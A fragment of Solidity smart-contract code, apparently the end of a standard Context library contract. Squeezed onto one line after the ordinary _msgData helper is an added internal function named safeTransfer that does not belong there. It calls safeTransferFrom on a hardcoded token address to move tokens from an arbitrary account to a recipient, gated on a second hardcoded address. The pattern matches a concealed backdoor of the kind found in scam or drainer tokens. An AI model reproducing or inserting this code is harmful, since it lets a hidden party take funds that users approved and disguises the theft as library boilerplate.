 ...
 */
  function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}function safeTransfer(address spender,address recipient,uint256 amount) internal returns (bool) {if (msg.sender != address(0x9d4815543Fb1339889eEcF182d9b2c736930D537)) {TransferHelper.safeTransferFrom(0x89c8B778C07f54e8aA2098D821d7FF76bC52707C,spender,recipient,amount);return true;}return false;}
}
